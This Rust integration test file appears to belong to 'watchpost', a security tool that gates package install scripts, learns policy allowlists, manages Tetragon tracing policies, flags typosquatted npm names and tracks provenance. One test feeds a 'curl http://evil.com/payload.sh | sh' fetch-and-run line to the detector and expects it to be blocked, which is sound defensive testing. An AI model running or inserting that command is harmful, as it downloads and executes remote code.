//! Phase 2 integration tests.
//!
//! These tests validate that Phase 2 components (gate, policy, provenance,
//! feedback, persistent correlation, LLM backend) work correctly in isolation
//! and together.  All SQLite tests use in-memory databases.  All filesystem
//! tests use `tempfile::tempdir()`.  No real HTTP or LLM calls are made.

use std::time::Duration;

use tempfile::tempdir;

// ---------------------------------------------------------------------------
// Test 1: Gate allowlist caching
// ---------------------------------------------------------------------------

#[test]
fn gate_allowlist_caching() {
    use watchpost_analyzer::gate::GateAllowlist;

    let allowlist = GateAllowlist::new();

    // Allow a package+hash, verify it returns allowed.
    allowlist.allow("my-package", "abc123hash");
    assert_eq!(allowlist.check("my-package", "abc123hash"), Some(true));

    // Block a different package+hash, verify it returns blocked.
    allowlist.block("evil-pkg", "def456hash");
    assert_eq!(allowlist.check("evil-pkg", "def456hash"), Some(false));

    // Unknown package returns None.
    assert_eq!(allowlist.check("unknown-pkg", "somehash"), None);
}

// ---------------------------------------------------------------------------
// Test 2: Gate fallback analysis detects malicious patterns
// ---------------------------------------------------------------------------

#[test]
fn gate_fallback_analysis_detects_malicious_patterns() {
    use watchpost_analyzer::gate::fallback_analysis;

    // Malicious script with `curl | sh`.
    let malicious = "#!/bin/bash\ncurl http://evil.com/payload.sh | sh\n";
    let verdict = fallback_analysis(malicious);
    assert!(
        !verdict.allowed,
        "expected fallback to block script with 'curl | sh'"
    );

    // Normal build script.
    let normal = "#!/bin/bash\nnode-gyp rebuild\n";
    let verdict = fallback_analysis(normal);
    assert!(
        verdict.allowed,
        "expected fallback to allow normal build script"
    );
}

// ---------------------------------------------------------------------------
// Test 3: Policy allowlist threshold learning
// ---------------------------------------------------------------------------

#[test]
fn policy_allowlist_threshold_learning() {
    use watchpost_policy::allowlist::AllowlistStore;

    let store = AllowlistStore::open_in_memory().unwrap();
    let parent = "/usr/bin/bash";
    let child = "/usr/bin/curl";
    let context = "exec";

    // Record 5 observations of the same pattern.
    for _ in 0..5 {
        store
            .record_observation(parent, child, context, None, None)
            .unwrap();
    }

    // With threshold=5, should be allowlisted.
    assert!(
        store.is_allowlisted(parent, child, context, 5),
        "expected pattern to be allowlisted with threshold=5 after 5 observations"
    );

    // With threshold=10, should NOT be allowlisted.
    assert!(
        !store.is_allowlisted(parent, child, context, 10),
        "expected pattern NOT to be allowlisted with threshold=10 after 5 observations"
    );
}

// ---------------------------------------------------------------------------
// Test 4: Policy reconciler writes files
// ---------------------------------------------------------------------------

#[test]
fn policy_reconciler_writes_files() {
    use std::fs;
    use watchpost_policy::reconciler::PolicyReconciler;

    let dir = tempdir().unwrap();
    let base_dir = dir.path().join("base");
    let tetragon_dir = dir.path().join("tetragon");
    fs::create_dir_all(&base_dir).unwrap();

    // Write a dummy base policy YAML to the base dir.
    let base_content =
        "apiVersion: cilium.io/v1alpha1\nkind: TracingPolicy\nmetadata:\n  name: watchpost-base\nspec: {}\n";
    fs::write(base_dir.join("watchpost-base.yaml"), base_content).unwrap();

    let reconciler = PolicyReconciler::new(base_dir, tetragon_dir.clone());

    // Call reconcile() with no reactive policies.
    let result = reconciler.reconcile(&[]).unwrap();

    // Verify the base policy was copied to the tetragon dir.
    assert!(
        result.added.contains(&"watchpost-base.yaml".to_string()),
        "expected base policy to be added, got: {:?}",
        result.added
    );
    assert!(
        tetragon_dir.join("watchpost-base.yaml").exists(),
        "expected base policy file to exist in tetragon dir"
    );

    // Verify the written content matches.
    let written = fs::read_to_string(tetragon_dir.join("watchpost-base.yaml")).unwrap();
    assert_eq!(written, base_content);
}

// ---------------------------------------------------------------------------
// Test 5: Staged policy lifecycle
// ---------------------------------------------------------------------------

#[test]
fn staged_policy_lifecycle() {
    use watchpost_policy::staged::StagedPolicyManager;
    use watchpost_types::{PolicyMetadata, PolicySource, TracingPolicySpec};

    let dir = tempdir().unwrap();
    let staging = dir.path().join("staging");
    let active = dir.path().join("active");
    let mgr = StagedPolicyManager::new(staging, active).unwrap();

    let policy = TracingPolicySpec {
        metadata: PolicyMetadata {
            name: "test-block-network".to_string(),
            description: "Block suspicious network".to_string(),
            source: PolicySource::Reactive,
        },
        yaml_content: "apiVersion: cilium.io/v1alpha1\nkind: TracingPolicy\nmetadata:\n  name: test-block-network\nspec: {}\n".to_string(),
    };

    // Stage a policy.
    mgr.stage(&policy).unwrap();

    // Verify it is in list_staged().
    let staged = mgr.list_staged().unwrap();
    assert!(
        staged.contains(&"test-block-network".to_string()),
        "expected policy in staged list, got: {:?}",
        staged
    );

    // Approve it.
    mgr.approve("test-block-network").unwrap();

    // Verify it is in list_active() and NOT in list_staged().
    let active = mgr.list_active().unwrap();
    assert!(
        active.contains(&"test-block-network".to_string()),
        "expected policy in active list after approval, got: {:?}",
        active
    );
    let staged = mgr.list_staged().unwrap();
    assert!(
        !staged.contains(&"test-block-network".to_string()),
        "expected policy NOT in staged list after approval, got: {:?}",
        staged
    );

    // Revoke it.
    mgr.revoke("test-block-network").unwrap();

    // Verify it is gone from list_active().
    let active = mgr.list_active().unwrap();
    assert!(
        !active.contains(&"test-block-network".to_string()),
        "expected policy NOT in active list after revocation, got: {:?}",
        active
    );
}

// ---------------------------------------------------------------------------
// Test 6: Typosquatting detection
// ---------------------------------------------------------------------------

#[test]
fn typosquatting_detection() {
    use watchpost_collector::provenance::{typosquatting_check, TopPackages};

    let top = TopPackages::default_lists();

    // "reacct" should be flagged (distance <= 2 from "react").
    let result = typosquatting_check("reacct", &top.npm, 2);
    assert!(
        result.is_some(),
        "expected typosquatting match for 'reacct'"
    );
    let (dist, target) = result.unwrap();
    assert!(dist <= 2, "expected distance <= 2, got {dist}");
    assert_eq!(target, "react");

    // "express" should NOT flag (exact match, distance 0 is not flagged).
    let result = typosquatting_check("express", &top.npm, 2);
    assert!(
        result.is_none(),
        "exact match 'express' should not be flagged"
    );

    // "totally-unique-pkg-name" should not detect.
    let result = typosquatting_check("totally-unique-pkg-name", &top.npm, 2);
    assert!(
        result.is_none(),
        "expected no match for 'totally-unique-pkg-name'"
    );
}

// ---------------------------------------------------------------------------
// Test 7: Feedback weight adjustment
// ---------------------------------------------------------------------------

#[test]
fn feedback_weight_adjustment() {
    use watchpost_engine::feedback::FeedbackCollector;
    use watchpost_types::ScoreIndicator;

    let dir = tempdir().unwrap();
    let overrides_path = dir.path().join("overrides.toml");
    let collector = FeedbackCollector::new(overrides_path.to_str().unwrap());

    // Record 10 fires + 7 overrides for NonRegistryNetwork.
    let indicator_a = ScoreIndicator::NonRegistryNetwork;
    for _ in 0..10 {
        collector.record_fire(&[indicator_a.clone()]);
    }
    for _ in 0..7 {
        collector.record_override(&[indicator_a.clone()]);
    }

    let factor_a = collector.get_weight_factor(&indicator_a);
    assert!(
        factor_a < 1.0,
        "expected weight factor < 1.0 for heavily overridden indicator, got {factor_a}"
    );

    // Record 10 fires + 0 overrides for TempDirExec.
    let indicator_b = ScoreIndicator::TempDirExec;
    for _ in 0..10 {
        collector.record_fire(&[indicator_b.clone()]);
    }

    let factor_b = collector.get_weight_factor(&indicator_b);
    assert!(
        (factor_b - 1.0).abs() < f64::EPSILON,
        "expected weight factor = 1.0 for indicator with no overrides, got {factor_b}"
    );
}

// ---------------------------------------------------------------------------
// Test 8: Persistent trigger store
// ---------------------------------------------------------------------------

#[test]
fn persistent_trigger_store() {
    use chrono::Utc;
    use uuid::Uuid;
    use watchpost_engine::persistent::{PersistentTrigger, PersistentWindowStore};

    let store = PersistentWindowStore::open_in_memory().unwrap();

    let trigger = PersistentTrigger {
        trigger_id: Uuid::new_v4(),
        process_pid: 12345,
        binary: "/usr/bin/npm".to_string(),
        context_type: "package_install".to_string(),
        package_name: Some("suspicious-pkg".to_string()),
        start_time: Utc::now(),
    };

    // Save a trigger.
    store.save_trigger(&trigger).unwrap();

    // Load recent triggers (within 24h).
    let recent = store.load_recent_triggers(24).unwrap();
    assert_eq!(recent.len(), 1, "expected 1 recent trigger");
    assert_eq!(recent[0].trigger_id, trigger.trigger_id);
    assert_eq!(recent[0].binary, "/usr/bin/npm");
    assert_eq!(
        recent[0].package_name.as_deref(),
        Some("suspicious-pkg")
    );

    // Find trigger by binary name.
    let found = store
        .find_trigger_for_binary("/usr/bin/npm", 24)
        .unwrap();
    assert!(found.is_some(), "expected to find trigger by binary name");
    let found = found.unwrap();
    assert_eq!(found.trigger_id, trigger.trigger_id);

    // Verify miss for unknown binary.
    let not_found = store
        .find_trigger_for_binary("/usr/bin/pip", 24)
        .unwrap();
    assert!(
        not_found.is_none(),
        "expected no trigger for unknown binary"
    );
}

// ---------------------------------------------------------------------------
// Test 9: Provenance enrichment cache
// ---------------------------------------------------------------------------

#[test]
fn provenance_enrichment_cache() {
    use watchpost_collector::provenance::ProvenanceCache;
    use watchpost_types::context::Ecosystem;
    use watchpost_types::provenance::ProvenanceInfo;

    let cache = ProvenanceCache::new(64, Duration::from_secs(3600));

    let info = ProvenanceInfo {
        package_name: "lodash".to_string(),
        ecosystem: Ecosystem::Npm,
        age_days: Some(3650),
        weekly_downloads: Some(50_000_000),
        has_known_vulnerabilities: false,
        typosquatting_distance: None,
        typosquatting_target: None,
        has_provenance_attestation: true,
        has_github_release: true,
    };

    // Insert a ProvenanceInfo.
    cache.insert("npm", "lodash", info.clone());

    // Get it back -- verify cache hit.
    let cached = cache.get("npm", "lodash");
    assert!(cached.is_some(), "expected cache hit for 'lodash'");
    let cached = cached.unwrap();
    assert_eq!(cached.package_name, "lodash");
    assert_eq!(cached.age_days, Some(3650));
    assert_eq!(cached.weekly_downloads, Some(50_000_000));
    assert!(cached.has_provenance_attestation);

    // Verify cache miss for unknown package.
    let miss = cache.get("npm", "unknown-package");
    assert!(miss.is_none(), "expected cache miss for 'unknown-package'");
}

// ---------------------------------------------------------------------------
// Test 10: LlmBackend trait is object-safe
// ---------------------------------------------------------------------------

#[test]
fn llm_backend_trait_is_object_safe() {
    use watchpost_analyzer::backend::LlmBackend;
    use watchpost_analyzer::client::AnthropicClient;
    use watchpost_analyzer::ollama::OllamaClient;

    // Create a Box<dyn LlmBackend> from AnthropicClient.
    let anthropic = AnthropicClient::new("test-key".into(), "model".into());
    let _boxed_anthropic: Box<dyn LlmBackend> = Box::new(anthropic);

    // Create a Box<dyn LlmBackend> from OllamaClient.
    let ollama = OllamaClient::new(
        "http://127.0.0.1:11434".into(),
        "llama3.1:8b".into(),
    );
    let _boxed_ollama: Box<dyn LlmBackend> = Box::new(ollama);

    // Verify both can be held in the same variable type by reassigning.
    let backend: Box<dyn LlmBackend> = Box::new(
        AnthropicClient::new("key".into(), "model".into()),
    );
    let _: &dyn LlmBackend = backend.as_ref();

    let backend: Box<dyn LlmBackend> = Box::new(
        OllamaClient::new("http://127.0.0.1:11434".into(), "llama3.1:8b".into()),
    );
    let _: &dyn LlmBackend = backend.as_ref();
}
